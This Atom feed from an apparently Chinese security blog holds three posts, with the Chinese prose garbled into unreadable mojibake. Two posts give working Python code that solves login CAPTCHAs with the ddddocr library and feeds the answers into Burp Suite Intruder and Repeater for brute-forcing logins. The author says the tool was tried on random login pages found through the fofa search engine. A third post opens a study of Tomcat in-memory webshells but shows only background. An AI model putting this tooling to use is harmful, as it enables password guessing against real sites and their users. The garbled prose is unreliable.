<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://ja9er.github.io</id>
    <title>Ja9er&apos;s Studio</title>
    <updated>2022-01-17T03:48:03.257Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://ja9er.github.io"/>
    <link rel="self" href="https://ja9er.github.io/atom.xml"/>
    <subtitle>ç‡ƒçƒ§æ‰æ€»æ¯”æ¶ˆå¤±å¥½</subtitle>
    <logo>https://ja9er.github.io/images/avatar.png</logo>
    <icon>https://ja9er.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, Ja9er&apos;s Studio</rights>
    <entry>
        <title type="html"><![CDATA[ä»éªŒè¯ç çˆ†ç ´å¼€å§‹çš„burpæ’ä»¶å­¦ä¹ ]]></title>
        <id>https://ja9er.github.io/post/IX1z9lGDP/</id>
        <link href="https://ja9er.github.io/post/IX1z9lGDP/">
        </link>
        <updated>2022-01-17T03:25:56.000Z</updated>
        <content type="html"><![CDATA[<h1 id="ä»éªŒè¯ç çˆ†ç ´å¼€å§‹çš„burpæ’ä»¶å­¦ä¹ ">ä»éªŒè¯ç çˆ†ç ´å¼€å§‹çš„burpæ’ä»¶å­¦ä¹ </h1>
<blockquote>
<p>PSï¼šä»…ä»…ä½œä¸ºå­¦ä¹ ,æ²¡ä»€ä¹ˆç”¨ğŸ˜ƒ</p>
</blockquote>
<p>ä¹‹å‰æ”¹äº†ä¸€ä¸ªéªŒè¯ç çˆ†ç ´çš„burpæ’ä»¶ã€‚å°æ”¹äº†å…¶ä»–å¸ˆå‚…çš„ä»£ç ã€‚</p>
<p>ç°åœ¨ä»å¤´å­¦ä¹ ä¸€ä¸‹burpçš„æ’ä»¶å¼€å‘ï¼Œç›®æ ‡æ˜¯å®ç°åœ¨repeateræ¨¡å—çš„ç™»å½•å£è‡ªåŠ¨æ›´æ¢å®æ—¶éªŒè¯ç </p>
<p>å› ä¸ºpythonå¼€å‘æ¯”è¾ƒæ–¹ä¾¿ï¼Œè¿™é‡Œç›´æ¥é€‰pythonã€‚</p>
<h2 id="ç¯å¢ƒé…ç½®">ç¯å¢ƒé…ç½®</h2>
<p>åœ¨extender-Options-PythonEnvironmentä¸­é…ç½®ä½ çš„jython.jaræ–‡ä»¶è·¯å¾„</p>
<p>py2ä¸‹è½½burpåŒ…</p>
<p>ç„¶åå°±å¯ä»¥æ„‰å¿«çš„å¼€å§‹å¼€å‘äº†</p>
<h2 id="å®ç°">å®ç°</h2>
<p>burpæä¾›äº†æ‰€æœ‰APIç›¸å…³<a href="https://portswigger.net/burp/extender/api/index.html">æ–‡æ¡£</a>ä»¥åŠå¼€å‘ç¤ºä¾‹<a href="https://portswigger.net/burp/extender/">demo</a></p>
<p>ä¹‹å‰æ”¹çš„è„šæœ¬æ˜¯çˆ†ç ´æ¨¡å—çš„ï¼Œç°åœ¨å°è¯•æ”¹ä¸€ä¸ªrepeteræ¨¡å—çš„å‡ºæ¥</p>
<p>é€šè¿‡æ–‡æ¡£å’Œdemoé˜…è¯»ï¼Œå‘ç°æ‰€æœ‰çš„æ’ä»¶éƒ½éœ€è¦ç»§æ‰¿IBurpExtenderè¿™ä¸ªç±»</p>
<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/7U4u6O"><img src="https://s4.ax1x.com/2022/01/17/7U4u6O.png" alt="7U4u6O.png" loading="lazy"></a></figure>
<p>æ‰€ä»¥é¦–å…ˆéœ€è¦ä¸€ä¸ªç±»ç»§æ‰¿ä»–ï¼Œä¹Ÿå°±æ˜¯è¿™æ ·</p>
<pre><code class="language-python">class BurpExtender(IBurpExtender):
</code></pre>
<p>IBurpExtenderç±»é»˜è®¤éœ€è¦registerExtenderCallbackså‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ç”¨æ¥æ³¨å†Œåˆå§‹åŒ–ã€‚Callback æ­¤å˜é‡æ˜¯åœ¨ä¹¦å†™burpæ’ä»¶ä¸­æœ€å¿…ä¸å¯å°‘çš„å˜é‡ï¼Œå¦‚æœä½ éœ€è¦è°ƒç”¨ä½ æ‰€å¯¼å‡ºçš„apiçš„å‡½æ•°çš„è¯ï¼Œå¿…é¡»è¦ç”¨Callbackå…ˆæ³¨å†Œä¸€ä¸‹ï¼Œå¦‚ä¸‹.registxxxxxxæ˜¯å¾…ä¼šå„¿æˆ‘ä»¬è°ƒç”¨çš„å…¶ä»–ç±»çš„æ³¨å†Œæ–¹æ³•ï¼Œè¿™é‡Œæš‚æ—¶ç”¨registxxxxxxæ¥ä»£æ›¿</p>
<pre><code class="language-python">class BurpExtender(IBurpExtender):
	    def registerExtenderCallbacks(self, callbacks):
        	# æ–¹ä¾¿ä¸€ä¼šå„¿è°ƒç”¨
       		self._callbacks = callbacks
       		self._callbacks.registxxxxxx(self)
            # æ’ä»¶é‡Œé¢æ˜¾ç¤ºçš„åå­—
       		callbacks.setExtensionName(&quot;OCR_CAPTCHA_repeter&quot;)
</code></pre>
<p>ç„¶åæˆ‘ä»¬ä¸æ˜¯è¦æ‰¾repeteræ¨¡å—å—ï¼Œåœ¨HTTPæ¶ˆæ¯å¤„ç†æ¥å£ç±»ä¸­å‘ç°IHttpListeneræ¯”è¾ƒç¬¦åˆè¿™ä¸ªé€‰æ‹©,æ‹¦æˆªä»»ä½•burpå·¥å…·å‘å‡ºçš„requestå’Œresponse</p>
<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/7U4n1K"><img src="https://s4.ax1x.com/2022/01/17/7U4n1K.png" alt="7U4n1K.png" loading="lazy"></a></figure>
<p>å‡½æ•°é•¿è¿™æ ·</p>
<pre><code class="language-java">processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo)
This method is invoked when an HTTP request is about to be issued, and when an HTTP response has been received.
</code></pre>
<p>ç¬¬ä¸€ä¸ªå‚æ•°toolFlagåˆ¤æ–­ä»å“ªä¸ªå·¥å…·ä¼ æ¥çš„ï¼Œè¿™ä¸ªå‚æ•°åœ¨IBurpExtenderåˆå§‹åŒ–çš„callbackä¸­ç¡¬ç¼–ç ã€‚å¦‚å›¾,æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åˆ¤æ–­æ˜¯å¦repeaterä¸­ä¼ æ¥å°±è¡Œ</p>
<figure data-type="image" tabindex="3"><a href="https://imgtu.com/i/7U4KXD"><img src="https://s4.ax1x.com/2022/01/17/7U4KXD.png" alt="7U4KXD.png" loading="lazy"></a></figure>
<p>æ˜¾ç„¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨IHttpListenerè¿™ä¸ªç±»äº†ï¼Œæ­¤æ—¶ä»£ç å¦‚ä¸‹,æ³¨å†Œä¸€ä¸ªhttplistenerã€‚ä½¿ç”¨<code>registerHttpListener</code></p>
<pre><code class="language-python">class BurpExtender(IBurpExtender, IHttpListener):

    def registerExtenderCallbacks(self, callbacks):
        # æ–¹ä¾¿ä¸€ä¼šè°ƒç”¨
        self._callbacks = callbacks
        self._callbacks.registerHttpListener(self)
        #helpç±»å¸®åŠ©è§£ææ•°æ®
        self._helpers = callbacks.getHelpers()
        # æ’ä»¶é‡Œé¢æ˜¾ç¤ºçš„åå­—
        callbacks.setExtensionName(&quot;OCR_CAPTCHA_repeter&quot;)
        print(&quot;init success&quot;)
     
</code></pre>
<p>IHttpListenerå…·ä½“çš„å®ç°æ–¹æ³•åœ¨å®ƒçš„processHttpMessageæ–¹æ³•ä¸­ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬ç»§æ‰¿åè¦å®ç°çš„æ–¹æ³•ï¼Œä¹Ÿæ˜¯åˆšåˆšåœ¨æ–‡æ¡£ä¸­çœ‹åˆ°çš„é‚£ä¸ªæ–¹æ³•</p>
<figure data-type="image" tabindex="4"><a href="https://imgtu.com/i/7U4mp6"><img src="https://s4.ax1x.com/2022/01/17/7U4mp6.png" alt="7U4mp6.png" loading="lazy"></a></figure>
<p>å®ç°ä»£ç å¦‚ä¸‹</p>
<pre><code class="language-python">def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
      	#toolFlagåˆ¤æ–­ä»REPEATERä¼ æ¥è¯·æ±‚ï¼ŒmessageIsRequestæ˜¯ä¸€ä¸ªå‘ç‚¹éœ€è¦æ³¨æ„ï¼Œå®ƒçš„å€¼ä¸ºæ˜¯å¦å·²ç»å‘å‡ºè¯·æ±‚çš„åˆ¤æ–­ã€‚ä¸åœ¨å®ç°æ–¹æ³•ä¸­åˆ¤æ–­çš„è¯ä¼šå‘å‡ºä¸¤æ¬¡è¯·æ±‚ä»è€Œé€ æˆRequest has already been issuedçš„é”™è¯¯
        if toolFlag == self._callbacks.TOOL_REPEATER and messageIsRequest==1:
            #ä¸Šé¢å¼•å…¥çš„helpç±»è§£æä¼ å…¥çš„ä¿¡æ¯
            analyIRequestInfo = self._helpers.analyzeRequest(messageInfo)
            #è·å–æ•´ä¸ªrequestçš„å†…å®¹
            request = messageInfo.getRequest()
            #è¯·æ±‚bodyå†…å®¹éœ€è¦è®¡ç®—ç¼“å­˜
            body = request[analyIRequestInfo.getBodyOffset():]
            headers = analyIRequestInfo.getHeaders()
            #è·å–requestä¸­æˆ‘ä»¬è‡ªå·±åŠ çš„headerä¸­å­—æ®µå†…å®¹ï¼ŒDDDDOCRè¡¨ç¤ºè¯·æ±‚éªŒè¯ç ç”Ÿæˆçš„url
            DDURL = re.findall(r&quot;DDDDOCR:(.*?)\,&quot;, str(headers))
            if len(DDURL) &gt; 0:
                cookie = re.findall(&quot;Cookie: (.*?)\s&quot;, str(headers))[0]
                #filedä¸ºè‡ªå·±å®šä¹‰çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨æ¥è·å–bodyä¸­çš„éªŒè¯ç å‚æ•°çš„å€¼
                filed = re.findall(r&quot;filed:(.*?)\,&quot;, str(headers))[0]
                value = re.findall(filed, body.tostring())[0]#è·å–åˆ°éªŒè¯ç çš„å€¼ï¼Œæ–¹ä¾¿åé¢æ›¿æ¢
                OCR_CAPTCHA_url = DDURL[0]
                requestheaders = {
                    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;,
                    &quot;Cookie&quot;: cookie}
                request = urllib2.Request(OCR_CAPTCHA_url, headers=requestheaders)
                ssl._create_default_https_context = ssl._create_unverified_context
                host = ('127.0.0.1', 5000)
                CAPTCHA = urllib2.urlopen(request)  # è·å–å›¾ç‰‡
                CAPTCHA_base64 = base64.b64encode(CAPTCHA.read())  # æŠŠå›¾ç‰‡base64ç¼–ç 
                request = urllib2.Request('http://%s:%s/base64' % host, 'base64=' + CAPTCHA_base64)
                response = urllib2.urlopen(request).read()
                #body.tostring()è½¬ä¸ºå­—ç¬¦ä¸²å½¢å¼ï¼Œtypeä¸ºstrå’Œpythonä¸­ç±»å‹ä¸€è‡´
                data = str(body.tostring()).replace(value, response)
              	#æ„å»ºæ–°çš„è¯·æ±‚æ›¿æ¢åŸæ¥çš„è¯·æ±‚
                newHttpMessage = self._helpers.buildHttpMessage(headers, data)
                messageInfo.setRequest(newHttpMessage)
</code></pre>
<h2 id="æ•ˆæœ">æ•ˆæœ</h2>
<p>è´´ä¸€ä¸ªåç«¯ä»£ç </p>
<pre><code class="language-python">from flask import Flask
from flask import request
import ddddocr
import re, time, base64
app = Flask(__name__)
#è¿”å›æˆ‘ä»¬ä¼ çš„verifyçš„å€¼
@app.route('/test',methods=[&quot;POST&quot;])
def getrequest():
    verify = request.values.get(&quot;verify&quot;)
    return verify
@app.route('/',methods=[&quot;GET&quot;])
def show_image():
    with open('static/log.txt', 'r') as f:
        content = f.read()
    data = '&lt;title&gt;404 NOT FOUND&lt;/title&gt;&lt;body style=&quot;text-align:center&quot;&gt;&lt;h1&gt;éªŒè¯ç è¯†åˆ«&lt;/h1&gt;&lt;p&gt;&lt;TABLE style=&quot;&quot; borderColor=&quot;&quot; height=40 cellPadding=1 align=center border=20&gt;&lt;tr align=center&gt;&lt;td&gt;éªŒè¯ç &lt;/td&gt;&lt;td&gt;è¯†åˆ«ç»“æœ&lt;/td&gt;&lt;td&gt;æ—¶é—´&lt;/td&gt;&lt;/tr&gt;%s&lt;/body&gt;' % (
        content)
    return data

@app.route('/base64',methods=[&quot;POST&quot;])
def ocr():
    count=5
    try:
        base64_img = request.values.get(&quot;base64&quot;)
        img_name = time.time()
        ocr = ddddocr.DdddOcr(show_ad=False)
        base64_img =str(base64_img).replace(' ', '+')
        img_bytes = base64.b64decode(base64_img)
        res = ocr.classification(img_bytes)
        with open('static/log.txt', 'r') as f:
            data = &quot;&quot;
            counts = 0
            content = f.read()
            pattern = re.compile(r'.*?\n')
            result1 = pattern.findall(content)
            for i in result1:
                counts += 1
                if counts &gt;= count: break
                data = data + i
        with open('static/log.txt', 'w+') as f:
            f.write('&lt;tr align=center&gt;&lt;td&gt;&lt;img src=&quot;data:image/png;base64,%s&quot;/&gt;&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;\n' % (
            base64_img, res, time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime(int(img_name)))) + data)

        return res
    except Exception as e:
        return &quot;0000&quot;
if __name__ == '__main__':
    app.run()

</code></pre>
<p>éšä¾¿æ‰¾ä¸€ä¸ªéªŒè¯ç ç”Ÿæˆurlä½œä¸ºéªŒè¯ï¼Œå¯ä»¥çœ‹åˆ°è¿”å›çš„å€¼æ˜¯éªŒè¯ç å›¾ç‰‡çš„å€¼ï¼Œè€Œä¸æ˜¯requeståŒ…ä¸­çš„1234</p>
<figure data-type="image" tabindex="5"><a href="https://imgtu.com/i/7U4l0H"><img src="https://s4.ax1x.com/2022/01/17/7U4l0H.gif" alt="7U4l0H.gif" loading="lazy"></a></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ä»OCRåº“è”åŠ¨burpéªŒè¯ç çˆ†ç ´]]></title>
        <id>https://ja9er.github.io/post/RIelZKt8X/</id>
        <link href="https://ja9er.github.io/post/RIelZKt8X/">
        </link>
        <updated>2022-01-14T03:06:35.000Z</updated>
        <content type="html"><![CDATA[<h1 id="ä»ocråº“è”åŠ¨burpéªŒè¯ç çˆ†ç ´">ä»OCRåº“è”åŠ¨burpéªŒè¯ç çˆ†ç ´</h1>
<h2 id="ocråº“é€‰æ‹©">OCRåº“é€‰æ‹©</h2>
<p>è¿™é‡Œç›´æ¥é€‰æ‹©DDDDOCRè¿™ä¸ªåº“ï¼Œéå¸¸å¥½ç”¨</p>
<p>é¦–å…ˆPIPä¸‹è½½</p>
<blockquote>
<p>python3 -m pip install ddddocr -i https://pypi.tuna.tsinghua.edu.cn/simple</p>
</blockquote>
<p>å®˜æ–¹ç”¨æ³•ï¼Œè¿™é‡Œçš„img_bytesæ˜¯åå…­è¿›åˆ¶æ•°æ®</p>
<pre><code class="language-python">import ddddocr
ocr = ddddocr.DdddOcr()
with open('1.png', 'rb') as f:
    img_bytes = f.read()
res = ocr.classification(img_bytes)
print(res)
</code></pre>
<p>æ•ˆæœå¯ä»¥çœ‹åˆ°è¿˜æ˜¯éå¸¸ä¸é”™çš„</p>
<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/7U2p4K"><img src="https://s4.ax1x.com/2022/01/17/7U2p4K.png" alt="7U2p4K.png" loading="lazy"></a></figure>
<h2 id="æœåŠ¡ç«¯">æœåŠ¡ç«¯</h2>
<p>å› ä¸ºDDDDOCRè¿™ä¸ªåº“æ˜¯python3çš„ï¼Œburpçš„jythonæ˜¯python2çš„ï¼Œæ˜¾ç„¶ä¸èƒ½æ··åœ¨ä¸€èµ·ç”¨ã€‚æ‰€ä»¥æš‚æ—¶è®¾ç½®ä¸ºC/Sæ¶æ„ã€‚æŠŠéªŒè¯ç è¯†åˆ«æœåŠ¡åŒ–ã€‚è¿™é‡Œç›´æ¥é­”æ”¹å…¶ä»–å¸ˆå‚…çš„é¡¹ç›®ã€‚å½“ç„¶ä¹Ÿå¯ä»¥ç”¨flaskèµ·ä¸€ä¸ªè½»é‡æœåŠ¡å™¨ã€‚</p>
<p>è¿™æ˜¯python3çš„æœåŠ¡è„šæœ¬ï¼Œé»˜è®¤è·¯å¾„ä¸‹å±•ç¤ºæœ€æ–°è¯†åˆ«çš„20ä¸ªéªŒè¯ç ,è·¯å¾„/base64 ä½œä¸ºè¯†åˆ«æ¥å£ï¼Œè·å–ä¼ å…¥çš„img base64åçš„æ•°æ®ï¼Œè¿”å›è¯†åˆ«å­—ç¬¦</p>
<pre><code class="language-python">#!/usr/bin/env python
# -*- conding:utf-8 -*-
import ddddocr
from http.server import HTTPServer, BaseHTTPRequestHandler
import re, time, base64, os
import urllib.parse

host = ('0.0.0.0', 8899)
count = 20  # ä¿å­˜å¤šå°‘ä¸ªéªŒè¯ç åŠç»“æœ

class Resquest(BaseHTTPRequestHandler):
    def handler(self):
        print(&quot;data:&quot;, self.rfile.readline().decode())
        self.wfile.write(self.rfile.readline())

    def do_GET(self):
        print(self.requestline)
        if self.path != '/':
            self.send_error(404, &quot;Page not Found!&quot;)
            return
        with open('temp/log.txt', 'r') as f:
            content = f.read()
        data = '&lt;title&gt;404 NOT FOUND&lt;/title&gt;&lt;body style=&quot;text-align:center&quot;&gt;&lt;h1&gt;éªŒè¯ç è¯†åˆ«&lt;/h1&gt;&lt;p&gt;&lt;TABLE style=&quot;&quot; borderColor=&quot;&quot; height=40 cellPadding=1 align=center border=20&gt;&lt;tr align=center&gt;&lt;td&gt;éªŒè¯ç &lt;/td&gt;&lt;td&gt;è¯†åˆ«ç»“æœ&lt;/td&gt;&lt;td&gt;æ—¶é—´&lt;/td&gt;&lt;/tr&gt;%s&lt;/body&gt;'%(content)
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=UTF-8')
        self.end_headers()
        self.wfile.write(data.encode())
    def do_POST(self):
        text = ''
        try:
            if self.path != '/base64':
                self.send_error(404, &quot;Page not Found!&quot;)
                return
            req_datas = self.rfile.read(int(self.headers['content-length']))
            req_datas = req_datas.decode()
            base64_img = str(req_datas).replace(&quot;base64=&quot;, &quot;&quot;)
            base64_img = urllib.parse.unquote(base64_img)
            # print(base64_img.group(1)) #post base64å‚æ•°çš„å†…å®¹
            img_name=time.time()
            with open(&quot;temp/%s.png&quot;%img_name, 'wb') as f:
                f.write(base64.b64decode(base64_img))
                f.close()
            ocr = ddddocr.DdddOcr(show_ad=False)
            img_bytes = base64.b64decode(base64_img)
            res = ocr.classification(img_bytes)
            text = res
            print(text)
            with open('temp/log.txt', 'r') as f:
                data = &quot;&quot;
                counts = 0
                content = f.read()
                pattern = re.compile(r'.*?\n')
                result1 = pattern.findall(content)
                for i in result1:
                    counts += 1
                    if counts &gt;= count:break
                    data = data + i
            with open('temp/log.txt', 'w+') as f:
                f.write('&lt;tr align=center&gt;&lt;td&gt;&lt;img src=&quot;data:image/png;base64,%s&quot;/&gt;&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;\n'%(base64_img,text,time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime(int(img_name))))+ data)
            os.remove(&quot;temp/%s.png&quot; % img_name)
        except Exception as e:
            text = '0000'
            print('\nè¯†åˆ«å¤±è´¥ï¼\n')
            print(e)
        if text == '':
            text = '0000'
            print('\nè¯†åˆ«å¤±è´¥ï¼\n')
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(text.encode('utf-8'))


if __name__ == '__main__':
    server = HTTPServer(host, Resquest)
    print(&quot;Starting server, listen at: %s:%s&quot; % host)
    server.serve_forever()

</code></pre>
<p>éšæœºåœ¨fofaä¸Šæ‰¾äº†å‡ ä¸ªå¸¦éªŒè¯ç çš„ç™»å½•å£è¯•äº†è¯•ï¼Œä¹±ç æ˜¯å› ä¸ºä¿å­˜ä¸‹æ¥çš„å­—ç¬¦ç¼–ç ä»UTF8è¢«æ¢åˆ°äº†GBK</p>
<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/7UgzAx"><img src="https://s4.ax1x.com/2022/01/17/7UgzAx.png" alt="7UgzAx.png" loading="lazy"></a></figure>
<h2 id="burpæ’ä»¶">Burpæ’ä»¶</h2>
<p>burpç»™äº†å¾ˆå¤šapiç”¨äºå†™æ’ä»¶ï¼ŒåŸºæœ¬æ¯ä¸ªæ¨¡å—éƒ½ç»™äº†ã€‚åœ¨extender-APIsä¸­å¯ä»¥æŸ¥çœ‹è¯¦æƒ…ï¼Œå› ä¸ºéªŒè¯ç è¯†åˆ«ä¸€èˆ¬ç”¨äºç™»å½•å£çˆ†ç ´ä¹‹ç±»çš„æ¨¡å—ï¼Œæ‰€ä»¥é€‰æ‹©çˆ†ç ´æ¨¡å—ä¹Ÿå°±æ˜¯IIntruderPayloadGeneratorFactoryã€‚</p>
<pre><code class="language-python">#!/usr/bin/env python
# coding:utf-8
from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator
import base64
import json
import re
import urllib2
import ssl

host = ('127.0.0.1', 8899)#æœåŠ¡ç«¯çš„IPå’ŒPORT

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):#IBurpExtenderæ˜¯æ¯ä¸ªæ’ä»¶éƒ½è¦ç”¨çš„ï¼Œè®©burpè¯†åˆ«ä½ ä¸ºæ’ä»¶
    def registerExtenderCallbacks(self, callbacks):
        #æ³¨å†Œpayloadç”Ÿæˆå™¨
        callbacks.registerIntruderPayloadGeneratorFactory(self)
        #æ’ä»¶é‡Œé¢æ˜¾ç¤ºçš„åå­—
        callbacks.setExtensionName(&quot;OCR_CAPTCHA&quot;)
        print 'OCR_CAPTCHA\nç”¨æ³•ï¼š\nåœ¨headå¤´éƒ¨æ·»åŠ DDDDOCR:éªŒè¯ç çš„URL\n\nå¦‚ï¼š\n\nPOST /login HTTP/1.1\nHost: www.baidu.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\nAccept: text/plain, */*; q=0.01\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nDDDDOCR:http://www.baidu.com/get-validate-code\nContent-Length: 84\nConnection: close\nCookie: JSESSIONID=24D59677C5EDF0ED7AFAB8566DC366F0\n\nusername=admin&amp;password=admin&amp;vcode=8888\n\n'

    def getGeneratorName(self):
        return &quot;OCR_CAPTCHA&quot;

    def createNewInstance(self, attack):
        return OCR_CAPTCHA(attack)

class OCR_CAPTCHA(IIntruderPayloadGenerator):
    def __init__(self, attack):
        tem = &quot;&quot;.join(chr(abs(x)) for x in attack.getRequestTemplate()) #requestå†…å®¹
        cookie = re.findall(&quot;Cookie: (.+?)\r\n&quot;, tem)[0] #è·å–cookieï¼Œç”¨äºè¯·æ±‚éªŒè¯ç 
        OCR_CAPTCHA = re.findall(&quot;DDDDOCR:(.+?)\r\n&quot;, tem)[0]
        ssl._create_default_https_context = ssl._create_unverified_context #å¿½ç•¥è¯ä¹¦ï¼Œé˜²æ­¢è¯ä¹¦æŠ¥é”™
        self.OCR_CAPTCHA = OCR_CAPTCHA
        self.cookie = cookie
        self.max = 1 #payloadæœ€å¤§ä½¿ç”¨æ¬¡æ•°
        self.num = 0 #æ ‡è®°payloadçš„ä½¿ç”¨æ¬¡æ•°
        self.attack = attack

    def hasMorePayloads(self):
        #å¦‚æœpayloadä½¿ç”¨åˆ°äº†æœ€å¤§æ¬¡æ•°resetå°±æ¸…0
        if self.num == self.max:
            return False  # å½“è¾¾åˆ°æœ€å¤§æ¬¡æ•°çš„æ—¶å€™å°±è°ƒç”¨reset
        else:
            return True

    def getNextPayload(self, payload):
        OCR_CAPTCHA_url = self.OCR_CAPTCHA #éªŒè¯ç url
        headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;,&quot;Cookie&quot;:self.cookie}
        request = urllib2.Request(OCR_CAPTCHA_url,headers=headers)
        CAPTCHA = urllib2.urlopen(request) #è·å–å›¾ç‰‡
        CAPTCHA_base64 = base64.b64encode(CAPTCHA.read()) #æŠŠå›¾ç‰‡base64ç¼–ç 
        request = urllib2.Request('http://%s:%s/base64'%host, 'base64='+CAPTCHA_base64)
        response = urllib2.urlopen(request).read()
        print(response)
        return response

    def reset(self):
        self.num = 0  # æ¸…é›¶
        return
</code></pre>
<p>åœ¨extensionsä¸­æ·»åŠ ä»¥åï¼Œéšä¾¿æ‰¾ä¸€ä¸ªå¸¦éªŒè¯ç çš„ç™»å½•å…¥å£æµ‹è¯•ã€‚</p>
<p>ä½¿ç”¨intruderçš„Pitchforkæ¨¡å—ï¼Œå°†poståŒ…ä¸­çš„éªŒè¯ç æ‰“ä¸Šæ ‡è®°ï¼Œå¹¶ä¸”æ–°å¢ä¸€ä¸ªå­—æ®µDDDDOCRï¼Œå€¼ä¸ºéªŒè¯ç äº§ç”Ÿçš„åœ°å€</p>
<pre><code class="language-http">POST /index.php?c=index&amp;a=login HTTP/1.1
Host:host
Content-Length: 51
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://host
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://host/index.php?c=index&amp;a=login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
DDDDOCR:http://host/index.php?c=verify_code
Cookie: PHPSESSID=51ilefnld0hlvmq8lm82pa2jvu0macg2
Connection: close

user=Â§adminÂ§&amp;password=123456&amp;VerifyCode=Â§z69sÂ§&amp;login=
</code></pre>
<p>payloadé€‰æ‹©æˆ‘ä»¬çš„æ’ä»¶</p>
<figure data-type="image" tabindex="3"><a href="https://imgtu.com/i/7UgvH1"><img src="https://s4.ax1x.com/2022/01/17/7UgvH1.png" alt="7UgvH1.png" loading="lazy"></a></figure>
<p>å¾—åˆ°å¦‚ä¸‹ç»“æœ</p>
<figure data-type="image" tabindex="4"><a href="https://imgtu.com/i/7U2SN6"><img src="https://s4.ax1x.com/2022/01/17/7U2SN6.png" alt="7U2SN6.png" loading="lazy"></a></figure>
<p>å‚è€ƒ</p>
<blockquote>
<p>https://github.com/smxiazi/NEW_xp_CAPTCHA</p>
<p>https://www.t00ls.cc/viewthread.php?tid=63498&amp;highlight=%E9%AA%8C%E8%AF%81%E7%A0%81</p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Tomcat å†…å­˜é©¬å­¦ä¹ ]]></title>
        <id>https://ja9er.github.io/post/tomcat-nei-cun-ma-xue-xi/</id>
        <link href="https://ja9er.github.io/post/tomcat-nei-cun-ma-xue-xi/">
        </link>
        <updated>2022-01-06T10:09:29.000Z</updated>
        <content type="html"><![CDATA[<h1 id="tomcat-å†…å­˜é©¬å­¦ä¹ ">Tomcat å†…å­˜é©¬å­¦ä¹ </h1>
<h2 id="å‰ç½®çŸ¥è¯†">å‰ç½®çŸ¥è¯†</h2>
<p>ä»€ä¹ˆæ˜¯Tomcat?</p>
<p>tomcatä½œä¸ºä¸€ä¸ª Web æœåŠ¡å™¨ï¼Œå®ç°äº†ä¸¤ä¸ªéå¸¸æ ¸å¿ƒçš„åŠŸèƒ½ï¼š</p>
<blockquote>
<p>**Http æœåŠ¡å™¨åŠŸèƒ½ï¼š**è¿›è¡Œ Socket é€šä¿¡(åŸºäº TCP/IP)ï¼Œè§£æ HTTP æŠ¥æ–‡</p>
<p>**Servlet å®¹å™¨åŠŸèƒ½ï¼š**åŠ è½½å’Œç®¡ç† Servletï¼Œç”± Servlet å…·ä½“è´Ÿè´£å¤„ç† Request è¯·æ±‚</p>
</blockquote>
<figure data-type="image" tabindex="1"><img src="image-20211229100649882.png" alt="" loading="lazy"></figure>
<p>HTTPæœåŠ¡å™¨åŠŸèƒ½å¯¹åº”tomcatçš„ç»„ä»¶è¿æ¥å™¨(Connector)ï¼Œå®ƒä¸»è¦å®ç°ä¸‰ä¸ªåŠŸèƒ½</p>
<blockquote>
<ul>
<li>socket é€šä¿¡ï¼Œä¹Ÿå°±æ˜¯ç½‘ç»œç¼–ç¨‹</li>
<li>è§£æå¤„ç†åº”ç”¨å±‚åè®®ï¼Œå°è£…æˆä¸€ä¸ª Request å¯¹è±¡</li>
<li>å°† Request è½¬æ¢ä¸º ServletRequestï¼Œå°† Response è½¬æ¢ä¸º ServletResponse</li>
</ul>
</blockquote>
<p>ä»¥ä¸Šåˆ†åˆ«å¯¹åº”ä¸‰ä¸ªç»„ä»¶ EndPointã€Processorã€Adapter æ¥å®Œæˆã€‚Endpoint è´Ÿè´£æä¾›è¯·æ±‚å­—èŠ‚æµç»™Processorï¼ŒProcessor è´Ÿè´£æä¾› Tomcat å®šä¹‰çš„ Request å¯¹è±¡ç»™ Adapterï¼ŒAdapter è´Ÿè´£æä¾›æ ‡å‡†çš„ ServletRequest å¯¹è±¡ç»™ Servlet å®¹å™¨ã€‚</p>
